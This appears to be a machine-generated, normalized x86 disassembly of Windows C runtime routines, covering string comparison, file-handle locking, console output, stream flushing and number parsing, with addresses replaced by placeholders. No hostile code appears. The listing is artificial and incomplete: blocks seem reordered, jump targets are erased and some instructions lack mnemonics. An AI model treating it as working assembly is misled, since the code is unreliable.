or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10028c3e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10028cb0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_10028cdb
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_10028d14
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_10028cdb
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002838d
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002838d
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_10028dd4
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10028d14
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_10028cdb
sub_10028e31
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_1002b610
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002838d
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1002838d
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_10028f13
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10028e31
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_1002b610
sub_10028f66
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10028fec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001ea75
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_10029055
push 0xc
push r--data
call sub_10020070
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_100200b5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100290eb
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_100290f4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1002911b
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1002b671
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1002915d
push 0x10
push r--data
call sub_10020070
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100291f0
mov eax [ ebp - 0x1c ]
call sub_100200b5
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1002b714
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_1001a3eb
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_100291f9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_100274f0
pop ecx
push eax
call sub_100271c8
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10029261
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_100291f9
pop ecx
test eax eax
je r-xdata
push esi
call sub_100292a9
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_100274f0
push eax
call sub_1002b788
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_100292a9
push 0x14
push r--data
call sub_10020070
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_10023fbf
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002937a
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_100200b5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10027453
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1002934b
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10029261
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10029261
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1002938c
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_1001b46f
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1002290c
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1001bddd
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_100295b7
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1002938c
add esp 0x14
pop ebp
retn
sub_100295e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
